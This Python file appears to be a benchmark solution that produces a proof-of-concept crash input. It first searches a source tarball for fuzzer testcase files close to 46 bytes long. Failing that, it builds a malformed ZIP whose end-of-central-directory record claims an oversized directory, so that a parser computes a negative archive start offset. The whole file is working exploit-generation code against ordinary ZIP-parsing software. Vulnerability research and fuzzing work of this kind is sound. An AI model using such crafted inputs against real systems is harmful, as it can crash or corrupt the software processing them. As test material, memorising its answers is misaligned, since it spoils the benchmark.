import os
import tarfile


class Solution:
    def solve(self, src_path: str) -> bytes:
        # Try to locate an existing PoC inside the tarball (if provided)
        try:
            if src_path and os.path.exists(src_path):
                candidates = []
                with tarfile.open(src_path, "r:*") as tar:
                    for m in tar.getmembers():
                        if not m.isfile():
                            continue
                        # Only consider reasonably small files
                        if m.size <= 0 or m.size > (1 << 20):
                            continue
                        name = os.path.basename(m.name)
                        name_lower = name.lower()
                        # Heuristic: look for likely PoC names
                        if not any(
                            kw in name_lower
                            for kw in (
                                "poc",
                                "crash",
                                "id_",
                                "clusterfuzz",
                                "repro",
                                "input",
                                "testcase",
                            )
                        ):
                            continue
                        f = tar.extractfile(m)
                        if f is None:
                            continue
                        data = f.read()
                        if not data:
                            continue
                        # Heuristic to prefer binary-ish files
                        non_ascii = sum(1 for b in data if b < 9 or (13 < b < 32) or b > 126)
                        binary_score = non_ascii / len(data)
                        if binary_score < 0.3:
                            continue
                        # Score: prefer length close to 46 and more binary-ish
                        score = 0
                        score -= abs(len(data) - 46)  # closer to 46 is better
                        score += int(binary_score * 10)
                        candidates.append((score, len(data), data))
                if candidates:
                    candidates.sort(key=lambda x: (-x[0], x[1]))
                    return candidates[0][2]
        except Exception:
            pass

        # Fallback: construct a crafted ZIP-like file intended to trigger
        # a negative archive start offset computation.
        # Central directory header (46 bytes)
        cd_header = bytes(
            [
                0x50,
                0x4B,
                0x01,
                0x02,  # central file header signature
                0x14,
                0x00,  # version made by
                0x0A,
                0x00,  # version needed to extract
                0x00,
                0x00,  # general purpose bit flag
                0x00,
                0x00,  # compression method (store)
                0x00,
                0x00,  # last mod file time
                0x00,
                0x00,  # last mod file date
                0x00,
                0x00,
                0x00,
                0x00,  # crc-32
                0x00,
                0x00,
                0x00,
                0x00,  # compressed size
                0x00,
                0x00,
                0x00,
                0x00,  # uncompressed size
                0x00,
                0x00,  # file name length
                0x00,
                0x00,  # extra field length
                0x00,
                0x00,  # file comment length
                0x00,
                0x00,  # disk number start
                0x00,
                0x00,  # internal file attributes
                0x00,
                0x00,
                0x00,
                0x00,  # external file attributes
                0x00,
                0x00,
                0x00,
                0x00,  # relative offset of local header
            ]
        )

        # End of central directory record (22 bytes),
        # crafted so that cd_offset + cd_size > eocd_offset.
        eocd = bytes(
            [
                0x50,
                0x4B,
                0x05,
                0x06,  # EOCD signature
                0x00,
                0x00,  # number of this disk
                0x00,
                0x00,  # disk where central directory starts
                0x01,
                0x00,  # number of central directory records on this disk
                0x01,
                0x00,  # total number of central directory records
                0x40,
                0x00,
                0x00,
                0x00,  # size of central directory (64 bytes, larger than actual)
                0x00,
                0x00,
                0x00,
                0x00,  # offset of start of central directory
                0x00,
                0x00,  # ZIP file comment length
            ]
        )

        return cd_header + eocd